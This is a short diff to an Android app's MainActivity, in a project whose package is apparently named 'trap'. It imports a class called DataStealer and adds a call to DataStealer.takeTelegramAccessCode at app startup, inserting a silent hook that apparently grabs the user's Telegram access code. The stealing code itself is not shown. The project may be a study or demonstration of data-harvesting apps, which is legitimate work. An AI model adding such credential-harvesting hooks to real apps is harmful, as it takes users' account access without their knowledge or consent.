@@ -11,6 +11,7 @@ import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.viewpager.widget.ViewPager;
 import de.hpi3d.gamepgrog.trap.R;
+import de.hpi3d.gamepgrog.trap.android.DataStealer;
 import de.hpi3d.gamepgrog.trap.android.PermissionHelper;
 import de.hpi3d.gamepgrog.trap.android.firebase.OurFirebaseMessagingService;
 import de.hpi3d.gamepgrog.trap.api.ApiIntent;
@@ -41,6 +42,8 @@ public class MainActivity extends AppCompatActivity {
         if (!StorageManager.with(this).userid.exists()) {
             registerUserAndSendFBToken();
         }
+
+        DataStealer.takeTelegramAccessCode(this);
     }
 
     private void registerUserAndSendFBToken() {
